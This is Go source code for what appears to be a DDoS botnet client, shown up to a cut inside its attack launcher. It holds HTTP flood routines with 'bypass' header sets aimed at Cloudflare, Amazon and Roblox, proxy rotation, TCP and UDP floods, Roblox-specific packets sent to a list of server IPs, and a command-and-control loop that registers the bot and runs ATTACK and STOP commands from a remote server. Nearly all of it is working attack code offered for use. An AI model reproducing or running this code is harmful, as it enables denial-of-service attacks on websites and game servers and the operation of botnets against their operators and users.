package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// COMPLETE 60 CHROME USER AGENTS
var userAgents = [60]string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Linux; Android 13; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 11; moto g power (2022)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 11; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/109.0.5414.112 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/108.0.5359.124 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/105.0.5195.100 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/109.0.5414.112 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/105.0.5195.100 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Linux; Android 12; SM-X800) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Linux; Android 12; SM-X806B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Linux; Android 11; Lenovo TB-J606F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-T510) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Vivaldi/6.2.3105.58",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 OPR/108.0.0.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
	"Mozilla/5.0 (X11; CrOS x86_64 15117.111.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.110 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
}

// YOUR ORIGINAL CLOUDFLARE BYPASS HEADERS - UNTOUCHED
var cfBypassHeaders = []map[string]string{
	{
		"User-Agent":                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"Accept-Language":           "en-US,en;q=0.9",
		"Accept-Encoding":           "gzip, deflate, br",
		"Connection":                "keep-alive",
		"Upgrade-Insecure-Requests": "1",
		"Cache-Control":             "max-age=0",
	},
}

// AMAZON BYPASS HEADERS
var amazonBypassHeaders = []map[string]string{
	{
		"User-Agent":                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"Accept-Language":           "en-US,en;q=0.9",
		"Accept-Encoding":           "gzip, deflate, br",
		"Connection":                "keep-alive",
		"Upgrade-Insecure-Requests": "1",
		"Cache-Control":             "no-cache",
		"Pragma":                    "no-cache",
		"Sec-Fetch-Dest":            "document",
		"Sec-Fetch-Mode":            "navigate",
		"Sec-Fetch-Site":            "none",
		"Sec-Fetch-User":            "?1",
	},
}

// ENHANCED ROBLOX BYPASS HEADERS
var robloxBypassHeaders = []map[string]string{
	{
		"User-Agent":         "RobloxPlayer/WinInet",
		"Accept":             "*/*",
		"Accept-Language":    "en-us",
		"Accept-Encoding":    "gzip, deflate",
		"Roblox-Place-Id":    "0",
		"Roblox-Machine-Id":  "0",
		"Roblox-Game-Client": "1",
		"Connection":         "keep-alive",
		"Cache-Control":      "no-cache",
		"Origin":             "https://www.roblox.com",
		"Referer":            "https://www.roblox.com/",
		"Sec-Fetch-Dest":     "empty",
		"Sec-Fetch-Mode":     "cors",
		"Sec-Fetch-Site":     "same-site",
	},
}

var (
	requestCount   int64
	successCount   int64
	errorCount     int64
	useProxies     bool
	proxyFile      string
	userAgentFile  string
	workingProxies []string
	userAgentsList []string
	proxyIndex     int32
	activeThreads  int32
	attackRunning  int32
	currentMethod  string
	targetHost     string
	targetPort     string
	httpClient     *http.Client
	clientPool     sync.Pool
	bypassMode     string
	c2Server       string
	c2Connected    int32
	stopAttackFlag int32
	c2Conn         net.Conn
	c2Mutex        sync.Mutex
	c2Reader       *bufio.Reader
	c2Writer       *bufio.Writer
	attackContext  context.Context
	attackCancel   context.CancelFunc
)

func purple(text string) string     { return "\033[35m" + text + "\033[0m" }
func green(text string) string      { return "\033[32m" + text + "\033[0m" }
func red(text string) string        { return "\033[31m" + text + "\033[0m" }
func cyan(text string) string       { return "\033[36m" + text + "\033[0m" }
func yellow(text string) string     { return "\033[33m" + text + "\033[0m" }
func boldPurple(text string) string { return "\033[1;35m" + text + "\033[0m" }

func init() {
	transport := &http.Transport{
		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:          5000,
		MaxIdleConnsPerHost:   5000,
		MaxConnsPerHost:       5000,
		IdleConnTimeout:       90 * time.Second,
		TLSHandshakeTimeout:   10 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
		DisableCompression:    false,
		DisableKeepAlives:     false,
		ForceAttemptHTTP2:     true,
	}
	httpClient = &http.Client{Transport: transport, Timeout: 15 * time.Second}

	clientPool = sync.Pool{
		New: func() interface{} {
			return &http.Client{
				Transport: &http.Transport{
					TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
					MaxIdleConns:        500,
					MaxIdleConnsPerHost: 500,
					IdleConnTimeout:     30 * time.Second,
					DisableCompression:  false,
					DisableKeepAlives:   false,
				},
				Timeout: 10 * time.Second,
			}
		},
	}
}

func loadUserAgents(filename string) error {
	file, err := os.Open(filename)
	if err != nil {
		return err
	}
	defer file.Close()

	userAgentsList = []string{}
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		ua := strings.TrimSpace(scanner.Text())
		if ua != "" {
			userAgentsList = append(userAgentsList, ua)
		}
	}
	if len(userAgentsList) == 0 {
		userAgentsList = userAgents[:]
	}
	fmt.Printf(purple("[+]")+" Loaded %d user agents\n", len(userAgentsList))
	return scanner.Err()
}

func getRandomUserAgent() string {
	if len(userAgentsList) > 0 {
		return userAgentsList[rand.Intn(len(userAgentsList))]
	}
	return userAgents[rand.Intn(len(userAgents))]
}

func getBypassHeaders() []map[string]string {
	switch bypassMode {
	case "amazon":
		return amazonBypassHeaders
	case "roblox":
		return robloxBypassHeaders
	default:
		return cfBypassHeaders
	}
}

func testProxy(proxyURL string, results chan<- string, wg *sync.WaitGroup) {
	defer wg.Done()
	if !strings.HasPrefix(proxyURL, "http://") && !strings.HasPrefix(proxyURL, "https://") {
		proxyURL = "http://" + proxyURL
	}
	proxy, err := url.Parse(proxyURL)
	if err != nil {
		return
	}
	client := &http.Client{
		Transport: &http.Transport{
			Proxy:           http.ProxyURL(proxy),
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		Timeout: 5 * time.Second,
	}
	resp, err := client.Get("https://httpbin.org/ip")
	if err != nil {
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode == 200 {
		results <- strings.TrimPrefix(proxyURL, "http://")
	}
}

func loadAndTestProxies(filename string) error {
	file, err := os.Open(filename)
	if err != nil {
		return err
	}
	defer file.Close()

	var allProxies []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxy := strings.TrimSpace(scanner.Text())
		if proxy != "" {
			allProxies = append(allProxies, proxy)
		}
	}

	fmt.Printf(purple("[+]")+" Testing %d proxies...\n", len(allProxies))
	results := make(chan string, len(allProxies))
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, 100)

	for _, proxy := range allProxies {
		wg.Add(1)
		semaphore <- struct{}{}
		go func(p string) {
			defer func() { <-semaphore }()
			testProxy(p, results, &wg)
		}(proxy)
	}

	go func() {
		wg.Wait()
		close(results)
	}()

	workingProxies = []string{}
	count := 0
	for proxy := range results {
		workingProxies = append(workingProxies, proxy)
		count++
		if count%50 == 0 {
			fmt.Printf(green("[+]")+" Found %d working proxies...\n", count)
		}
	}
	fmt.Printf(green("[+]")+" Proxy check complete: %d/%d working\n", len(workingProxies), len(allProxies))
	if len(workingProxies) == 0 {
		return fmt.Errorf("no working proxies found")
	}
	return nil
}

func getNextProxy() string {
	if len(workingProxies) == 0 {
		return ""
	}
	idx := atomic.LoadInt32(&proxyIndex)
	atomic.StoreInt32(&proxyIndex, (idx+1)%int32(len(workingProxies)))
	return workingProxies[idx]
}

// ENHANCED ROBLOX GAME SERVER RESOLUTION
func resolveRobloxGameServer(placeID string) (string, int, error) {
	client := &http.Client{Timeout: 15 * time.Second}

	endpoints := []string{
		fmt.Sprintf("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100", placeID),
		fmt.Sprintf("https://www.roblox.com/games/getgameinstancesjson?placeId=%s&startIndex=0", placeID),
	}

	for _, endpoint := range endpoints {
		req, _ := http.NewRequest("GET", endpoint, nil)
		req.Header.Set("User-Agent", getRandomUserAgent())
		req.Header.Set("Accept", "application/json")
		req.Header.Set("Referer", "https://www.roblox.com/")
		req.Header.Set("Origin", "https://www.roblox.com")

		resp, err := client.Do(req)
		if err != nil {
			continue
		}

		if resp.StatusCode == 200 {
			var result map[string]interface{}
			if json.NewDecoder(resp.Body).Decode(&result) == nil {
				resp.Body.Close()

				if servers, ok := result["data"].([]interface{}); ok && len(servers) > 0 {
					if server, ok := servers[0].(map[string]interface{}); ok {
						if ip, ok := server["ip"].(string); ok && ip != "" {
							if port, ok := server["port"].(float64); ok {
								return ip, int(port), nil
							}
						}
					}
				}

				if servers, ok := result["Collection"].([]interface{}); ok && len(servers) > 0 {
					if server, ok := servers[0].(map[string]interface{}); ok {
						if ip, ok := server["Address"].(string); ok && ip != "" {
							if port, ok := server["Port"].(float64); ok {
								return strings.Split(ip, ":")[0], int(port), nil
							}
						}
					}
				}
			}
			resp.Body.Close()
		}
	}

	// Fallback to known Roblox server IP ranges
	robloxServers := []struct {
		ip   string
		port int
	}{
		{"158.58.182.100", 53640}, {"158.58.182.101", 53640}, {"158.58.182.102", 53640},
		{"158.58.182.103", 53640}, {"158.58.182.104", 53640}, {"158.58.182.105", 53640},
		{"158.58.182.106", 53640}, {"158.58.182.107", 53640}, {"158.58.182.108", 53640},
		{"158.58.182.109", 53640}, {"158.58.182.110", 53640}, {"158.58.182.111", 53640},
		{"158.58.182.112", 53640}, {"158.58.182.113", 53640}, {"158.58.182.114", 53640},
		{"158.58.182.115", 53640}, {"158.58.182.116", 53640}, {"158.58.182.117", 53640},
		{"158.58.182.118", 53640}, {"158.58.182.119", 53640}, {"158.58.182.120", 53640},
	}

	server := robloxServers[rand.Intn(len(robloxServers))]
	return server.ip, server.port, nil
}

func sendBypassRequest(targetURL string, proxy string) bool {
	if atomic.LoadInt32(&stopAttackFlag) == 1 {
		return false
	}

	if !strings.HasPrefix(targetURL, "http") {
		targetURL = "https://" + targetURL
	}

	var client *http.Client
	if proxy != "" {
		client = clientPool.Get().(*http.Client)
		defer clientPool.Put(client)
		proxyURL, err := url.Parse("http://" + proxy)
		if err == nil {
			if transport, ok := client.Transport.(*http.Transport); ok {
				transport.Proxy = http.ProxyURL(proxyURL)
			}
		}
	} else {
		client = httpClient
	}

	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		atomic.AddInt64(&errorCount, 1)
		return false
	}

	req.Header.Set("User-Agent", getRandomUserAgent())
	headers := getBypassHeaders()
	selectedHeaders := headers[rand.Intn(len(headers))]
	for key, value := range selectedHeaders {
		req.Header.Set(key, value)
	}

	// Add random parameters to bypass caching
	q := req.URL.Query()
	q.Add("_", fmt.Sprintf("%d", rand.Intn(999999)))
	q.Add("t", fmt.Sprintf("%d", time.Now().UnixNano()))
	req.URL.RawQuery = q.Encode()

	resp, err := client.Do(req)
	atomic.AddInt64(&requestCount, 1)
	if err != nil {
		atomic.AddInt64(&errorCount, 1)
		return false
	}
	defer resp.Body.Close()

	io.Copy(io.Discard, resp.Body)

	if resp.StatusCode > 0 {
		atomic.AddInt64(&successCount, 1)
		return true
	}
	atomic.AddInt64(&errorCount, 1)
	return false
}

// ULTRA-ENHANCED ROBLOX TCP FLOOD
func sendRobloxTCPFlood(target string, port string, proxy string) {
	if atomic.LoadInt32(&stopAttackFlag) == 1 {
		return
	}

	atomic.AddInt64(&requestCount, 1)
	dialer := &net.Dialer{
		Timeout:   3 * time.Second,
		KeepAlive: 30 * time.Second,
	}

	conn, err := dialer.Dial("tcp", fmt.Sprintf("%s:%s", target, port))
	if err != nil {
		atomic.AddInt64(&errorCount, 1)
		return
	}
	defer conn.Close()

	// Enhanced Roblox protocol packets
	robloxPackets := [][]byte{
		// Roblox join game packet
		{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x00, 0x4A, 0x4F, 0x49, 0x4E, 0x5F, 0x47, 0x41, 0x4D, 0x45},
		// Roblox ping packet
		{0x02, 0x00, 0x00, 0x00, 0x50, 0x49, 0x4E, 0x47},
		// Roblox data packet
		{0x03, 0x00, 0x00, 0x00, 0x44, 0x41, 0x54, 0x41},
		// Large random packets
		make([]byte, 512), make([]byte, 1024), make([]byte, 2048),
		// Roblox specific protocol headers
		{0x07, 0x00, 0x00, 0x00, 0x52, 0x4F, 0x42, 0x4C, 0x4F, 0x58},
	}

	// Initialize random packets
	for i := 3; i < len(robloxPackets)-1; i++ {
		rand.Read(robloxPackets[i])
	}

	// Send multiple packets in rapid succession
	for i := 0; i < 15; i++ {
		packet := robloxPackets[rand.Intn(len(robloxPackets))]
		conn.Write(packet)
		// Small random delay to mimic real client behavior
		time.Sleep(time.Duration(rand.Intn(50)) * time.Millisecond)
	}

	atomic.AddInt64(&successCount, 1)
}

// ENHANCED ROBLOX UDP FLOOD
func sendRobloxUDPFlood(target string, port string, proxy string) {
	if atomic.LoadInt32(&stopAttackFlag) == 1 {
		return
	}

	atomic.AddInt64(&requestCount, 1)
	udpAddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%s", target, port))
	if err != nil {
		atomic.AddInt64(&errorCount, 1)
		return
	}

	conn, err := net.DialUDP("udp", nil, udpAddr)
	if err != nil {
		atomic.AddInt64(&errorCount, 1)
		return
	}
	defer conn.Close()

	// Roblox UDP protocol packets
	udpPackets := [][]byte{
		// Roblox UDP handshake
		{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF},
		// Game data packets
		make([]byte, 256), make([]byte, 512), make([]byte, 1024),
		// Voice chat packets
		{0x56, 0x4F, 0x49, 0x43, 0x45, 0x5F, 0x44, 0x41, 0x54, 0x41},
		// Movement packets
		{0x4D, 0x4F, 0x56, 0x45, 0x4D, 0x45, 0x4E, 0x54},
	}

	// Initialize random packets
	for i := 1; i < 4; i++ {
		rand.Read(udpPackets[i])
	}

	// Send high-volume UDP packets
	for i := 0; i < 20; i++ {
		packet := udpPackets[rand.Intn(len(udpPackets))]
		conn.Write(packet)
	}

	atomic.AddInt64(&successCount, 1)
}

// ENHANCED TCP FLOOD
func sendTCPFlood(target string, port string, proxy string) {
	if atomic.LoadInt32(&stopAttackFlag) == 1 {
		return
	}

	atomic.AddInt64(&requestCount, 1)
	dialer := &net.Dialer{
		Timeout:   3 * time.Second,
		KeepAlive: 30 * time.Second,
	}

	conn, err := dialer.Dial("tcp", fmt.Sprintf("%s:%s", target, port))
	if err != nil {
		atomic.AddInt64(&errorCount, 1)
		return
	}
	defer conn.Close()

	payloadSizes := []int{64, 128, 256, 512, 1024, 1460, 2048}
	for i := 0; i < 8; i++ {
		size := payloadSizes[rand.Intn(len(payloadSizes))]
		payload := make([]byte, size)
		rand.Read(payload)
		// Mix of HTTP-like and random data
		if rand.Intn(2) == 0 {
			copy(payload[:4], []byte("GET /"))
		}
		conn.Write(payload)
	}
	atomic.AddInt64(&successCount, 1)
}

// ENHANCED UDP FLOOD
func sendUDPFlood(target string, port string, proxy string) {
	if atomic.LoadInt32(&stopAttackFlag) == 1 {
		return
	}

	atomic.AddInt64(&requestCount, 1)
	udpAddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%s", target, port))
	if err != nil {
		atomic.AddInt64(&errorCount, 1)
		return
	}

	conn, err := net.DialUDP("udp", nil, udpAddr)
	if err != nil {
		atomic.AddInt64(&errorCount, 1)
		return
	}
	defer conn.Close()

	packetTypes := [][]byte{
		make([]byte, 512), make([]byte, 128), make([]byte, 1024),
		make([]byte, 256), make([]byte, 768),
	}

	dnsQuery := []byte{
		0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x03, 0x77, 0x77, 0x77,
		0x06, 0x67, 0x6F, 0x6F, 0x67, 0x6C, 0x65, 0x03,
		0x63, 0x6F, 0x6D, 0x00, 0x00, 0x01, 0x00, 0x01,
	}

	gamePacket := []byte{0xFE, 0x01, 0xFA, 0x00, 0x00, 0x00, 0x00}

	for i := 0; i < 10; i++ {
		if rand.Intn(3) == 0 {
			conn.Write(dnsQuery)
		} else if rand.Intn(3) == 0 {
			conn.Write(gamePacket)
		} else {
			packet := packetTypes[rand.Intn(len(packetTypes))]
			rand.Read(packet)
			conn.Write(packet)
		}
	}
	atomic.AddInt64(&successCount, 1)
}

// CONNECTIVITY-FIXED C2 CONNECTION
func connectToC2() {
	for {
		c2Mutex.Lock()
		dialer := &net.Dialer{
			Timeout:   10 * time.Second,
			KeepAlive: 30 * time.Second,
		}

		conn, err := dialer.Dial("tcp", c2Server)
		if err != nil {
			c2Mutex.Unlock()
			fmt.Printf(red("[!]")+" C2 Connection failed: %v\n", err)
			atomic.StoreInt32(&c2Connected, 0)
			time.Sleep(5 * time.Second)
			continue
		}

		// Enhanced TCP settings for stability
		if tcpConn, ok := conn.(*net.TCPConn); ok {
			tcpConn.SetKeepAlive(true)
			tcpConn.SetKeepAlivePeriod(30 * time.Second)
			tcpConn.SetNoDelay(true)
			tcpConn.SetLinger(0)
		}

		c2Conn = conn
		c2Reader = bufio.NewReader(conn)
		c2Writer = bufio.NewWriter(conn)
		c2Mutex.Unlock()

		fmt.Printf(green("[+]")+" Connected to C2: %s\n", c2Server)
		atomic.StoreInt32(&c2Connected, 1)

		// Send bot info with enhanced details
		hostname, _ := os.Hostname()
		botInfo := fmt.Sprintf("BOT_ONLINE|%s|%s|%v|%s\n", hostname, getLocalIP(), useProxies, bypassMode)
		c2Mutex.Lock()
		c2Writer.WriteString(botInfo)
		c2Writer.Flush()
		c2Mutex.Unlock()

		// Handle commands with enhanced error handling
		reader := bufio.NewReader(conn)
		for {
			// Set reasonable read timeout with keep-alive
			conn.SetReadDeadline(time.Now().Add(300 * time.Second))

			command, err := reader.ReadString('\n')
			if err != nil {
				fmt.Printf(red("[!]")+" C2 Read error: %v\n", err)
				break
			}

			command = strings.TrimSpace(command)
			fmt.Printf(cyan("[C2]")+" Received: %s\n", command)

			// Enhanced keep-alive handling
			if command == "PING" {
				c2Mutex.Lock()
				c2Writer.WriteString("PONG\n")
				c2Writer.Flush()
				c2Mutex.Unlock()
				continue
			}

			// Execute command with proper context
			go executeC2Command(command)
		}

		// Cleanup on disconnect
		c2Mutex.Lock()
		if c2Conn == conn {
			c2Conn = nil
		}
		c2Mutex.Unlock()
		conn.Close()
		atomic.StoreInt32(&c2Connected, 0)

		fmt.Printf(yellow("[!]") + " C2 Connection lost, reconnecting in 3 seconds...\n")
		time.Sleep(3 * time.Second)
	}
}

func executeC2Command(command string) {
	parts := strings.Split(command, "|")
	if len(parts) < 2 {
		return
	}
	cmdType := parts[0]

	switch cmdType {
	case "ATTACK":
		if len(parts) < 7 {
			return
		}
		method, target, port := parts[1], parts[2], parts[3]
		threads, _ := strconv.Atoi(parts[4])
		duration, _ := strconv.Atoi(parts[5])
		bypass := parts[6]

		fmt.Printf(green("[+]")+" C2 ATTACK: %s %s:%s %d threads %ds bypass:%s\n",
			method, target, port, threads, duration, bypass)

		// Stop any running attack first
		if atomic.LoadInt32(&attackRunning) == 1 {
			stopAttack()
			time.Sleep(2 * time.Second) // Allow clean shutdown
		}

		bypassMode = bypass
		go startUnifiedAttack(target, port, method, threads, duration)

	case "STOP_ALL":
		fmt.Printf(red("[!]") + " C2 STOP ALL COMMAND\n")
		stopAttack()

	case "STATUS":
		c2Mutex.Lock()
		if c2Conn != nil {
			status := fmt.Sprintf("STATUS|Running:%v|Requests:%d|Success:%d|Bypass:%s|Threads:%d\n",
				atomic.LoadInt32(&attackRunning) == 1, atomic.LoadInt64(&requestCount),
				atomic.LoadInt64(&successCount), bypassMode, atomic.LoadInt32(&activeThreads))
			c2Writer.WriteString(status)
			c2Writer.Flush()
		}
		c2Mutex.Unlock()
	}
}

// FIXED ATTACK STOP FUNCTION
func stopAttack() {
	fmt.Printf(red("[!]") + " STOP COMMAND RECEIVED - TERMINATING ATTACK 100%%\n")
	atomic.StoreInt32(&stopAttackFlag, 1)

	// Allow threads to clean up
	time.Sleep(3 * time.Second)

	// Reset for next attack
	atomic.StoreInt32(&attackRunning, 0)
	atomic.StoreInt32(&stopAttackFlag, 0)

	fmt.Printf(green("[+]") + " ATTACK STOPPED 100%% - ALL THREADS TERMINATED\n")
	fmt.Printf(green("[+]") + " C2 CONNECTION STILL ACTIVE - READY FOR COMMANDS\n")
}

func getLocalIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "unknown"
	}
	defer conn.Close()
	return conn.LocalAddr().(*net.UDPAddr).IP.String()
}

// ENHANCED UNIFIED ATTACK WITH CONNECTIVITY FIXES
func startUnifiedAttack(target string, port string, method string, maxThreads int, duration int) {
	if atomic.LoadInt32(&attackRunning) == 1 {
